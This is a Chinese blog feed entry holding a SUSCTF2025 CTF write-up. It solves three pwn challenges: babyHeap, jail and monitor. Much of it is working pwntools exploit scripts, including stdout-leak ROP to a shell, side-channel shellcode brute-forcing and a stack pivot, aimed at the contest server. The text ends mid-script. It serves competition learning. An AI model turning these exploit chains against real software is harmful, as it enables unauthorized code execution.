    <category term="其他" scheme="http://iyheart.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    <category term="protobuf" scheme="http://iyheart.github.io/categories/%E5%85%B6%E4%BB%96/protobuf/"/>
    
    
  </entry>
  
  <entry>
    <title>SUSCTF2025-wp</title>
    <link href="http://iyheart.github.io/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/"/>
    <id>http://iyheart.github.io/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/</id>
    <published>2025-10-08T06:00:54.000Z</published>
    <updated>2025-10-08T07:15:41.016Z</updated>
    
    <content type="html"><![CDATA[<p>密码爆零了QAQ，pwn的话利用点比较简单，但是挖洞和逆向的过程非常有趣，而且题目本身出的难度不大（除了内核题。）</p><h1 id="pwn">PWN</h1><h2 id="babyheap">babyHeap</h2><h3 id="babyheap-分析">babyHeap-分析</h3><ul><li>做出来的时候就在想是不是非预期了，结合出题人给的提示，我应该是非预期手法做的。非预期手法其实根本不需要打<code>tcache_attack</code>。非预期的利用点在上海磐石中有考过，我也把这题作为stdout利用的例题之一了。<a href="https://iyheart.github.io/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/">IO利用之stdout任意读 | iyheart的博客</a></li><li>先查看保护机制，发现保护全开。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006232303192.png" alt="image-20251006232303192"></p><ul><li>看看<code>IDA pro</code>反编译的这个程序代码，经典的堆菜单题。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006232332193.png" alt="image-20251006232332193"></p><ul><li>漏洞点有两个，第一个在<code>delete</code>这边，存在一个<code>UAF</code>漏洞</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006232412584.png" alt="image-20251006232412584"></p><ul><li>第二个在<code>edit</code>这边，存在数组越界</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006232511784.png" alt="image-20251006232511784"></p><ul><li>这里我只使用数组越界，不用堆的打法。这里先是数组越界到<code>-8</code>这边，修改<code>stdout</code>结构体，可以泄露<code>libc</code>的地址。</li><li>然后再使用一次数组越界，继续修改<code>stdout</code>，此时泄露<code>environ</code>这个保存在libc中的变量，该变量存储的值其实就是栈地址。</li><li>这样<code>libc、栈</code>这两个地址都有了，然后需要确定调用<code>edit</code>时返回地址存放的栈地址。</li><li>接下来就是最关键的一个点，这个点其实在<code>8</code>月份的上海磐石就已经考过了。在索引<code>-11</code>的这个地方，有一个自己指向自己的<code>.data</code>段。这就给我们提供了一次任意地址写的机会。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233111523.png" alt="image-20251006233111523"></p><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233124287.png" alt="image-20251006233124287"></p><ul><li>此时可以先调用<code>edit()</code>将<code>0x564aef61d008 ◂— 0x564aef61d008</code>，修改成<code>0x564aef61d008 —▸ stack_addr</code></li><li>之后再调用<code>edit</code>，此时这样就可以直接修改返回地址，还可以绕过<code>canary</code>。</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="comment">#p = process(&#x27;./babyHeap&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;106.14.191.23&#x27;</span>,<span class="number">53057</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;user name:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;enter user id: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;enter user id: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;enter user id: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;[+] enter new user name: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先使用UAF泄露出堆的地址以便后续利用,但是后面发现UAF没有-11索引好用就放弃了</span></span><br><span class="line">    add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;username: &#x27;</span>)</span><br><span class="line">    leak = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] leak:&#x27;</span>,leak)</span><br><span class="line">    leak = u64(leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    key = leak</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] key:&#x27;</span>,<span class="built_in">hex</span>(key))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] leak:&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">    heap_one = leak*(<span class="number">2</span>**<span class="number">12</span>) + <span class="number">0x2a0</span></span><br><span class="line">    heap_base = heap_one - <span class="number">0x12a0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap_one:&#x27;</span>,<span class="built_in">hex</span>(heap_one))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap_base:&#x27;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0xFBDA1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p16(<span class="number">0x00</span>)</span><br><span class="line">    edit(-<span class="number">8</span>,payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    libc_leak = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,libc_leak)</span><br><span class="line">    libc_leak = u64(libc_leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> libc_leak &amp; <span class="number">0xfff</span> == <span class="number">0x150</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">        libc_base = libc_leak - <span class="number">0xf150</span> - <span class="number">0x21A000</span></span><br><span class="line">    <span class="keyword">elif</span> libc_leak &amp; <span class="number">0xfff</span> == <span class="number">0x87c</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">        libc_base = libc_leak - <span class="number">0x87c</span> - <span class="number">0x1E2000</span></span><br><span class="line">    <span class="keyword">elif</span> libc_leak &amp; <span class="number">0xfff</span> == <span class="number">0xff0</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">        libc_base = libc_leak - <span class="number">0x8BFF0</span></span><br><span class="line">    <span class="keyword">elif</span> libc_leak &amp; <span class="number">0xfff</span> == <span class="number">0x580</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">        libc_base = libc_leak - <span class="number">0x21B580</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] environ_addr:&#x27;</span>,<span class="built_in">hex</span>(environ))</span><br><span class="line">    payload = p64(<span class="number">0xFBDA1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(environ) + p64(environ+<span class="number">8</span>)</span><br><span class="line">    edit(-<span class="number">8</span>,payload)</span><br><span class="line">    stack_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] stack_addr:&#x27;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">    ret_addr = stack_addr - <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#delete(1)</span></span><br><span class="line">    <span class="comment">#delete(2)</span></span><br><span class="line">    <span class="comment">#ret_addrr = stack_addr - 0xE9-0x8 - 0x50</span></span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#delete(5)</span></span><br><span class="line">    <span class="comment">#delete(6)</span></span><br><span class="line">    edit(-<span class="number">11</span>,p64(ret_addr))</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">    ret = libc_base + <span class="number">0x29139</span></span><br><span class="line">    payload = p64(ret)+p64(pop_rdi) + p64(binsh_addr)+ p64(system_addr)</span><br><span class="line">    pause()</span><br><span class="line">    edit(-<span class="number">11</span>,payload)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233413081.png" alt="image-20251006233413081"></p><h3 id="babyheap-flag">babyHeap-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susctf&#123;th1s_1s_6a6y_h4@p_6842e397e2cb&#125;</span><br></pre></td></tr></table></figure><h2 id="jail">jail</h2><p>真服了这题，原来是静态flag，一直舍不得重置靶机，导致后面死循环进程原来越多，爆破起来非常不流畅。然后重置一回靶机再进行爆破发现非常流畅QAQ，要是在这题花少点时间，估计还可以把密码签到题牢出来的QAQ。</p><h3 id="jail-分析">jail-分析</h3><ul><li>查看一下保护机制，发现也是保护全开。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233916204.png" alt="image-20251006233916204"></p><ul><li>再进行程序的逆向，发现是个沙箱题</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006234015543.png" alt="image-20251006234015543"></p><ul><li>看看沙箱，沙箱出来啥也没有，但是发现是通过<code>prctl()</code>禁用的沙箱。没有仔细了解<code>prctl()</code>的参数，但是平时做沙箱题的时候，会发现使用<code>prctl()</code>开的沙箱的程序。该程序使用<code>seccomp-tools</code>查看禁用规则常常会和输出结果相反。</li><li>这题查看的规则是什么都没禁用，那就当他什么都被禁用了，没办法直接打印，那就侧信道爆破，而且<code>flag</code>已经被读到内存中了。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006234049092.png" alt="image-20251006234049092"></p><ul><li>调试的时候会发现存放<code>flag</code>的内存地址在栈上有出现，这样就非常好办了</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006234721027.png" alt="image-20251006234721027"></p><ul><li>接下来就是爆破需要用到的<code>shellcode</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        pop rbx</span></span><br><span class="line"><span class="string">        mov al,0x66</span></span><br><span class="line"><span class="string">    aaa:</span></span><br><span class="line"><span class="string">        cmp al,byte ptr [rbx+1]</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop </span></span><br><span class="line"><span class="string">        je aaa</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>爆破的完整代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">gdbscript=<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">           b *$rebase(0x1447)</span></span><br><span class="line"><span class="string">           set follow-fork-mode child</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;susctf&#123;71m3_w1ll_t3ll_&quot;</span><span class="comment">#&quot;w1ll_t3ll_509cb0c1274d&#125;&quot;</span></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./jail&#x27;,gdbscript=gdbscript)</span></span><br><span class="line"><span class="comment">#i是爆破flag的索引</span></span><br><span class="line">x = <span class="string">&quot;_&#125;&quot;</span>+string.digits + string.ascii_letters + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">candidate = <span class="string">&#x27;0123456789abcdef_ABCDEFGHIJKLMNOPQRSTUVWXYZghijklmnopqrstuvwxyz&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">0x80</span>):</span><br><span class="line">    <span class="comment"># j是爆破flag的ascii码</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;在爆破第<span class="subst">&#123;i&#125;</span>个字符,尝试字符<span class="subst">&#123;j&#125;</span>,此时flag为<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#p = process(&#x27;./jail&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;106.14.191.23&#x27;</span>,<span class="number">59387</span>)</span><br><span class="line">        <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">        context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">        <span class="comment">#print(j.to_bytes(1,&#x27;big&#x27;))</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            payload = <span class="string">b&#x27;____[\xb0&#x27;</span>+j.encode()+<span class="string">b&#x27;:\x03\x90\x90\x90\x90\x90\x90\x90t\xf5&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload = <span class="string">b&#x27;____[\xb0&#x27;</span>+j.encode()+<span class="string">b&#x27;:C&#x27;</span> + i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>) + <span class="string">b&#x27;\x90\x90\x90\x90\x90\x90\x90t\xf4&#x27;</span></span><br><span class="line">        <span class="comment">#b&#x27;____[\xb0 !   :C   \x02   t\xf9&#x27;</span></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;Input your code :&#x27;</span>,payload)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;jail :&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;aaasda&#x27;</span>,timeout=<span class="number">3.5</span>)</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag-----&gt;&#x27;</span>,flag)</span><br><span class="line">            sleep(<span class="number">0.5</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233818330.png" alt="image-20251006233818330"></p><h3 id="jail-flag">jail-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susctf&#123;71m3_w1ll_t3ll_fd9cb0c12d4d&#125;</span><br></pre></td></tr></table></figure><h2 id="monitor">monitor</h2><p>这题也折磨了好久，太久没打pwn都在学密码，手生了，再加上自己做题本来就慢。</p><h3 id="monitor-分析">monitor-分析</h3><p>这题给了一个程序附件，还给了一个自己编写的动态链接库。</p><ul><li>查看一下保护机制，发现<code>canary</code>没有开。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006235812678.png" alt="image-20251006235812678"></p><ul><li>然后直接分析程序，程序的大致逻辑就是：<ul><li>输入一个文件名，程序可以读取这个文件（有waf，会检查文件路径，是否存在<code>../</code>、<code>./</code>、<code>/</code>），并且将这个文件内容前<code>0x1000</code>字节读取到内存里面去，并且还会将文件的内容输出出来。</li><li>还会检查将要输出的内容是否有子字符串<code>susctf</code>，如果存在该子字符串就会提示要不要继续输出。继续输出的话程序会崩溃，而不输出，该字符串仍然会被保留在内存中。</li><li>还有就是输入<code>exit.run</code>会退出程序。</li></ul></li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006235733664.png" alt="image-20251006235733664"></p><ul><li>这里的漏洞点其实在这个地方，当时还以为只能<code>off-by-null</code>，但其实是<code>off-by-one</code></li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007000429193.png" alt="image-20251007000429193"></p><ul><li>但是要怎么泄露呢？在运行一次这个程序就会发现，当前文件路径下会多了一个<code>log.txt</code>，相当于文件<code>write</code>、<code>read</code>、<code>open</code>的日志。<code>log.txt</code>只会存放着<code>liblayer.so的地址</code>和<code>程序的基地址</code>，还会泄露<code>栈地址</code>。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007000716776.png" alt="image-20251007000716776"></p><ul><li>并且此时可以进行<code>off-by-one</code>利用这样就可以进行栈迁移，而栈地址又泄露出来，直接栈迁移到栈上，比较有操作性。并且在调试的时候还选用了如下的<code>gadget</code>，发现<code>call 0x5fe9</code>不会使得程序崩溃</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x000000000000604c: mov edi, 1; call 0x5fe9; pop rbp; ret; </span></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001303999.png" alt="image-20251007001303999"></p><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001328823.png" alt="image-20251007001328823"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./monitor&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;106.14.191.23&#x27;,57976)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What file you want open?\n&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What file you want open?\n&#x27;</span>,<span class="string">b&#x27;log.txt&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;this file.\n&#x27;</span>)</span><br><span class="line">leak_libc = p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)[-<span class="number">23</span>:-<span class="number">9</span>].decode()</span><br><span class="line">leak_pie = p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)[-<span class="number">23</span>:-<span class="number">9</span>].decode()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)</span><br><span class="line">leak_stack = p.recvuntil(<span class="string">b&#x27;, request&#x27;</span>)[-<span class="number">23</span>:-<span class="number">9</span>].decode()</span><br><span class="line">leak_libc = <span class="built_in">int</span>(leak_libc,<span class="number">16</span>)</span><br><span class="line">leak_stack = <span class="built_in">int</span>(leak_stack,<span class="number">16</span>)</span><br><span class="line">leak_pie = <span class="built_in">int</span>(leak_pie,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak_libc-----&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak_pie------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_pie))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak_stack----&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line">libc_base = leak_libc - <span class="number">0x71E8</span></span><br><span class="line">pie_base = leak_pie - <span class="number">0x20F0</span></span><br><span class="line">content_stack = leak_stack - <span 